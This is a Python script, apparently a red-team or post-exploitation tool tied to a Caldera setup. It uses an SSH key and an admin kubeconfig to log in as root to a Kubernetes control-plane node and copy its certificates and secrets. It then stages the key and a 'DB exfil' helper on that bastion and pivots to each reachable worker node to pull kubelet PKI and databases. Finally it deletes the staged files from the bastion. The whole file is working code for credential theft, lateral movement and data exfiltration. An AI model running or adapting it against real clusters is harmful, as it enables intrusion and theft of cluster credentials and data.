#!/usr/bin/env python3
"""Collect node secrets and certificates through the privileged SSH path."""

from __future__ import annotations

import json
import os
import shlex
import subprocess
import sys
from pathlib import Path


BASTION_USER = "root"
BASTION_PORT = "122"
TARGET_USER = "root"
TARGET_PORT = "122"
REMOTE_DIR_WORKER = "/host/var/lib/kubelet/pki"
REMOTE_DIR_CP = "/host/etc/kubernetes"


def run(cmd: list[str], **kwargs: object) -> subprocess.CompletedProcess[str]:
    return subprocess.run(cmd, text=True, **kwargs)


def ssh_opts(ssh_key: Path) -> list[str]:
    return [
        "ssh",
        "-n",
        "-i",
        str(ssh_key),
        "-o",
        "BatchMode=yes",
        "-o",
        "ConnectTimeout=8",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-o",
        "IdentitiesOnly=yes",
        "-o",
        "LogLevel=ERROR",
    ]


def scp_opts(ssh_key: Path) -> list[str]:
    return [
        "scp",
        "-i",
        str(ssh_key),
        "-P",
        BASTION_PORT,
        "-o",
        "BatchMode=yes",
        "-o",
        "ConnectTimeout=8",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-o",
        "IdentitiesOnly=yes",
        "-o",
        "LogLevel=ERROR",
    ]


def remote_ssh_base() -> str:
    return (
        "ssh -i /tmp/key -o BatchMode=yes -o ConnectTimeout=8 "
        "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
        "-o IdentitiesOnly=yes -o LogLevel=ERROR"
    )


def clean_reason(stderr: str) -> str:
    lines = []
    for line in stderr.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("Warning: Permanently added "):
            continue
        if line.startswith("Pseudo-terminal will not be allocated"):
            continue
        if line.startswith("Connection to ") and line.endswith(" closed."):
            continue
        lines.append(line)
    interesting = (
        "open failed",
        "administratively prohibited",
        "Permission denied",
        "Connection refused",
        "timed out",
        "No route to host",
        "Name or service not known",
        "Connection closed by",
        "can't execute",
    )
    for line in reversed(lines):
        if any(token in line for token in interesting):
            return line
    return lines[-1] if lines else stderr.strip().splitlines()[-1] if stderr.strip() else ""


def test_ssh(base: list[str], user: str, host: str, port: str) -> bool:
    completed = run(base + ["-p", port, f"{user}@{host}", "echo ok"], capture_output=True)
    if completed.returncode == 0:
        print(f"[+] SSH OK -> {user}@{host}:{port}")
        return True
    print(f"[-] SSH KO -> {user}@{host}:{port}")
    reason = clean_reason(completed.stderr or completed.stdout or "")
    if reason:
        print(f"   reason: {reason}")
    return False


def test_worker_ssh(base: list[str], bastion: str, worker_ip: str) -> bool:
    nested = f"{remote_ssh_base()} -p {TARGET_PORT} {TARGET_USER}@{worker_ip} 'echo ok'"
    completed = run(
        base + ["-p", BASTION_PORT, f"{BASTION_USER}@{bastion}", nested],
        capture_output=True,
    )
    if completed.returncode == 0:
        print(f"[+] SSH OK -> {TARGET_USER}@{worker_ip}:{TARGET_PORT} (via {bastion})")
        return True
    print(f"[-] SSH KO -> {TARGET_USER}@{worker_ip}:{TARGET_PORT} (via {bastion})")
    reason = clean_reason(completed.stderr or completed.stdout or "")
    if reason:
        print(f"   reason: {reason}")
    return False


def pipe_tar(ssh_cmd: list[str], dest: Path, timeout: int = 120) -> bool:
    dest.mkdir(parents=True, exist_ok=True)
    producer = subprocess.Popen(ssh_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=False)
    if producer.stdout is None:
        producer.kill()
        return False
    consumer = subprocess.Popen(
        ["tar", "-C", str(dest), "-xpf", "-"],
        stdin=producer.stdout,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=False,
    )
    producer.stdout.close()
    try:
        out_b, err_b = consumer.communicate(timeout=timeout)
        producer_rc = producer.wait(timeout=5)
        producer_err = producer.stderr.read() if producer.stderr else b""
    except subprocess.TimeoutExpired:
        producer.kill()
        consumer.kill()
        print(f"[-] copy timeout after {timeout}s", file=sys.stderr)
        return False

    err = b"".join(part for part in (producer_err, err_b, out_b) if part).decode("utf-8", "replace")
    if producer_rc == 0 and consumer.returncode == 0:
        return True
    if err.strip():
        print(clean_reason(err) or err.strip(), file=sys.stderr)
    return False


def fetch_dir(base: list[str], host: str, port: str, dest: Path, remote_dir: str) -> bool:
    parent = shlex.quote(str(Path(remote_dir).parent))
    leaf = shlex.quote(Path(remote_dir).name)
    print(f"[*] {host}: copying '{remote_dir}' -> {dest}/")
    cmd = base + ["-p", port, f"{BASTION_USER}@{host}", f"tar -C {parent} -cpf - {leaf}"]
    ok = pipe_tar(cmd, dest)
    print(f"[+] {host}: OK -> {dest}/{Path(remote_dir).name}" if ok else f"[-] {host}: copy FAILED")
    return ok


def fetch_worker_dir(base: list[str], bastion: str, worker_ip: str, dest: Path, remote_dir: str) -> bool:
    parent = shlex.quote(str(Path(remote_dir).parent))
    leaf = shlex.quote(Path(remote_dir).name)
    remote_tar = shlex.quote(f"tar -C {parent} -cpf - {leaf}")
    nested = f"{remote_ssh_base()} -p {TARGET_PORT} {TARGET_USER}@{worker_ip} {remote_tar}"
    print(f"[*] {worker_ip}: copying '{remote_dir}' -> {dest}/ (via {bastion})")
    cmd = base + ["-p", BASTION_PORT, f"{BASTION_USER}@{bastion}", nested]
    ok = pipe_tar(cmd, dest)
    print(f"[+] {worker_ip}: OK -> {dest}/{Path(remote_dir).name}" if ok else f"[-] {worker_ip}: copy FAILED")
    return ok


def worker_has_python(base: list[str], bastion: str, worker_ip: str) -> bool:
    nested = f"{remote_ssh_base()} -p {TARGET_PORT} {TARGET_USER}@{worker_ip} 'command -v python3 >/dev/null 2>&1'"
    completed = run(
        base + ["-p", BASTION_PORT, f"{BASTION_USER}@{bastion}", nested],
        capture_output=True,
    )
    return completed.returncode == 0


def run_worker_db_collection(base: list[str], bastion: str, worker_ip: str) -> bool:
    nested = (
        f"{remote_ssh_base()} -p {TARGET_PORT} {TARGET_USER}@{worker_ip} "
        "'/usr/bin/env python3 - 1' < /tmp/container-admin1.py"
    )
    completed = run(
        base + ["-p", BASTION_PORT, f"{BASTION_USER}@{bastion}", nested],
        capture_output=True,
    )
    if completed.stdout:
        print(completed.stdout, end="")
    if completed.returncode == 0:
        return True
    reason = clean_reason(completed.stderr or completed.stdout or "")
    print(f"[!] DB exfil script skipped/failed on {worker_ip}: {reason}")
    return False


def discover_workers(kubeconfig: Path, hosts_file: Path) -> list[tuple[str, str]]:
    completed = run(
        ["kubectl", "--kubeconfig", str(kubeconfig), "get", "nodes", "-o", "json"],
        capture_output=True,
    )
    if completed.returncode != 0:
        print(completed.stderr or completed.stdout, file=sys.stderr)
        return []

    payload = json.loads(completed.stdout)
    workers: list[tuple[str, str]] = []
    for item in payload.get("items", []):
        labels = item.get("metadata", {}).get("labels", {})
        if "node-role.kubernetes.io/control-plane" in labels:
            continue
        name = item.get("metadata", {}).get("name", "")
        for address in item.get("status", {}).get("addresses", []):
            ip = address.get("address", "")
            if address.get("type") == "InternalIP" and ip.count(".") == 3:
                workers.append((ip, name or ip))
                break

    hosts_file.parent.mkdir(parents=True, exist_ok=True)
    hosts_file.write_text("".join(f"{ip} - {name}\n" for ip, name in workers), encoding="utf-8")
    return workers


def upload_worker_helpers(base: list[str], ssh_key: Path, bastion: str) -> bool:
    helper = Path("/opt/caldera/KC4/container-admin1.py")
    if not helper.is_file():
        print(f"[!] missing optional DB exfil helper {helper}; worker DB collection skipped")
        return False

    print("[*] Uploading worker SSH key/script to bastion...")
    scp = scp_opts(ssh_key)
    first = run(scp + [str(helper), f"{BASTION_USER}@{bastion}:/tmp/container-admin1.py"])
    second = run(scp + [str(ssh_key), f"{BASTION_USER}@{bastion}:/tmp/key"])
    chmod = run(
        base
        + [
            "-p",
            BASTION_PORT,
            f"{BASTION_USER}@{bastion}",
            "chmod +x /tmp/container-admin1.py && chmod 600 /tmp/key",
        ]
    )
    return first.returncode == 0 and second.returncode == 0 and chmod.returncode == 0


def cleanup_bastion(base: list[str], bastion: str) -> None:
    run(
        base
        + [
            "-p",
            BASTION_PORT,
            f"{BASTION_USER}@{bastion}",
            "rm -f /tmp/key /tmp/container-admin1.py",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def main() -> int:
    data_path = Path(os.getenv("DATA_PATH", "/tmp/KCData"))
    control_plane = os.getenv("CONTROL_PLANE_NODE", "")
    if not control_plane:
        print("[-] CONTROL_PLANE_NODE is not set", file=sys.stderr)
        return 1

    ssh_key = data_path / "KC6" / "ssh" / "ssh-key"
    kubeconfig = data_path / "KC6" / "ops-admin.kubeconfig"
    hosts_file = data_path / "KC6" / "iphost"
    out_dir = data_path / "KC6" / "nodes-output"
    out_dir.mkdir(parents=True, exist_ok=True)

    if not ssh_key.is_file():
        print(f"[-] SSH_KEY not found: {ssh_key}", file=sys.stderr)
        return 1
    if not (ssh_key.parent / "ssh-key.pub").is_file():
        print(f"[-] Pub key missing: {ssh_key.parent / 'ssh-key.pub'}", file=sys.stderr)
        return 1
    if not kubeconfig.is_file():
        print(f"[-] KUBECONFIG not found: {kubeconfig}", file=sys.stderr)
        return 1

    base = ssh_opts(ssh_key)
    timestamp = os.popen("date -u +%Y%m%d-%H%M%S").read().strip()

    print(f"[i] generating {hosts_file} from worker nodes")
    workers = discover_workers(kubeconfig, hosts_file)

    if not test_ssh(base, BASTION_USER, control_plane, BASTION_PORT):
        print("   Tips: verification DS on control-plane and key in authorized_keys")
        return 1

    cp_dest = out_dir / f"bastion_{control_plane}-{timestamp}"
    if not fetch_dir(base, control_plane, BASTION_PORT, cp_dest, REMOTE_DIR_CP):
        return 1

    helpers_uploaded = upload_worker_helpers(base, ssh_key, control_plane) if workers else False
    try:
        for ip, tag in workers:
            if not test_worker_ssh(base, control_plane, ip):
                print(f"   (skip {ip})")
                continue

            worker_dest = out_dir / f"{tag}-{timestamp}"
            fetch_worker_dir(base, control_plane, ip, worker_dest, REMOTE_DIR_WORKER)

            if not helpers_uploaded:
                continue
            if not worker_has_python(base, control_plane, ip):
                print(f"[i] worker {ip} has no python3; skipping optional DB exfil script")
                continue

            print("Run script in pod")
            if run_worker_db_collection(base, control_plane, ip):
                db_dest = out_dir / f"{tag}-dbs-{timestamp}"
                fetch_worker_dir(base, control_plane, ip, db_dest, "/tmp/exfiltration/dbs")
    finally:
        if helpers_uploaded:
            cleanup_bastion(base, control_plane)

    print(f"[+] Done. Output in: {out_dir}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
